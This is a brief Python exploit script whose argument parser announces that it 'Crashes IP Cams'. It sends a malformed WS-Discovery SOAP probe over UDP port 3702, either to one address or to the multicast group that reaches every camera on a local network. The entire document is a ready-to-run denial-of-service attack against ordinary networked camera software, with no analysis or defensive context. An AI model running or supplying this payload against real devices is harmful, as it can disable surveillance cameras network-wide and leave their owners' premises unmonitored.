import socket
import sys
import argparse

parser = argparse.ArgumentParser(description='Crashes IP Cams')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--all', '-a', help='Crashes all IP Cams on the Network', action='store_true')
group.add_argument('--ip', '-i', metavar='IP', dest='addr', help='Crashes single IP Cam on the Network')

args = parser.parse_args()

if(args.all):
    UDP_IP="239.255.255.250"
else:
    UDP_IP=args.addr
UDP_PORT=3702
MESSAGE='<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:Dtapi="http://www.dektec.com/ws/v1/dtapi"><SOAP-ENV:Header><wsa:MessageID SOAP-ENV:mustUnderstand="true">5c58676a-8f9a-67222b74</wsa:MessageID><wsa:ReplyTo SOAP-ENV:mustUnderstand="true"><wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address></wsa:ReplyTo><wsa:To SOAP-ENV:mustUnderstand="true">urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action SOAP-ENV:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><wsd:Probe><wsd:ProbeType><wsd:Types>Flole:Crash</wsd:Types></wsd:ProbeType></wsd:Probe></SOAP-ENV:Body></SOAP-ENV:Envelope>'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if (sys.version_info > (3, 0)):
    sock.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
else:
    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
